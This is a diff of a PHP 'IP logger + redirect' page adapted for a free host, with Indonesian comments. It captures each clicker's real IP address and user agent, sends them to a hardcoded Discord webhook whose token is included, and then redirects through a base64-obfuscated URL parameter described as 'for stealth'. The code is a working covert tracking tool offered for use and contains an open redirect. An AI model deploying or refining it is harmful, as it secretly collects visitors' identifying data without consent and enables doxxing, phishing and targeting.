@@ -1,68 +1,66 @@
 <?php
 // ============================================
-// IP Logger + Redirect Website
+// IP Logger + Redirect Website (Fixed for InfinityFree)
 // ============================================
 
 $webhookurl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
 
-// Configuration
 $config = [
-    'default_redirect' => 'https://discord.gg/fMbZNhGVmh',  // Where to send if no target specified
-    'log_file' => 'clicks.json',                  // Local backup log (optional)
-    'require_param' => 'url',                      // ?url= parameter name
-    'obfuscate' => true                            // Base64 decode URLs for stealth
+    'default_redirect' => 'https://discord.gg/fMbZNhGVmh', 
+    'require_param' => 'url',                     
+    'obfuscate' => true                           
 ];
 
-// ============================================
-// LOGGING FUNCTION (Your existing code, enhanced)
-// ============================================
 function logVisitor($webhookurl) {
-    $ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR'];
-    $browser = $_SERVER['HTTP_USER_AGENT'];
+    // InfinityFree menggunakan reverse proxy, ambil IP asli pengunjung lewat HTTP_X_FORWARDED_FOR
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    } else {
+        $ip = !empty($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
+    }
     
-    // Block bots
-    if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
+    $browser = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown Browser';
+    
+    // Matikan pemblokir bot ketat saat uji coba agar tidak memblokir diri sendiri
+    if(preg_match('/bot|robot|spider|crawler/i', $browser)) {
         return false;
     }
     
     $TheirDate = date('d/m/Y');
     $TheirTime = date('G:i:s');
     
-    // Get IP details
-    $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
-    $vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
-    
-    $vpn = ($vpnCon->connection_type === "Corporate") ? "Yes" : "No";
-    $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
-    
-    $data = "**🎯 New Click**\n**IP:** `$ip`\n**ISP:** {$details->isp}\n**Date:** $TheirDate\n**Time:** $TheirTime\n**Location:** {$details->city}, {$details->region}\n**Country:** {$details->country}\n**VPN:** $vpn\n**Browser:** $browser";
+    // JANGAN gunakan ip-api.com / geoiplookup di InfinityFree karena diblokir hosting gratis!
+    // Kita kirim IP mentah & Browser User-Agent secara langsung.
+    $data = "**🎯 New Click Detected!**\n" .
+            "**IP Address:** `$ip`\n" .
+            "**Date:** $TheirDate\n" .
+            "**Time:** $TheirTime\n" .
+            "**Browser Info:** `$browser`";
     
     $json_data = [
         'content' => $data,
-        'username' => "Visitor from {$details->country}",
-        'avatar_url' => $flag
+        'username' => "Logger Server Bot"
     ];
     
-    // Send to Discord
     $ch = curl_init($webhookurl);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
     curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    
+    // Tambahkan timeout agar eksekusi script tidak menggantung jika Discord sibuk
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); 
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    
     curl_exec($ch);
     curl_close($ch);
     
     return true;
 }
 
-// ============================================
-// REDIRECT HANDLER
-// ============================================
-
-// Get target URL from query parameter or path
+// Handling Redirect
 $target = isset($_GET[$config['require_param']]) ? $_GET[$config['require_param']] : null;
 
-// If obfuscated (Base64), decode it
 if ($target && $config['obfuscate']) {
     $decoded = base64_decode($target, true);
     if ($decoded !== false) {
@@ -70,15 +68,14 @@ if ($target && $config['obfuscate']) {
     }
 }
 
-// Validate URL
 if (!$target || !filter_var($target, FILTER_VALIDATE_URL)) {
     $target = $config['default_redirect'];
 }
 
-// Log the visit
+// Jalankan pencatatan log
 logVisitor($webhookurl);
 
-// Perform redirect
+// Alihkan halaman ke target
 header("Location: " . $target, true, 302);
 exit();
 ?>
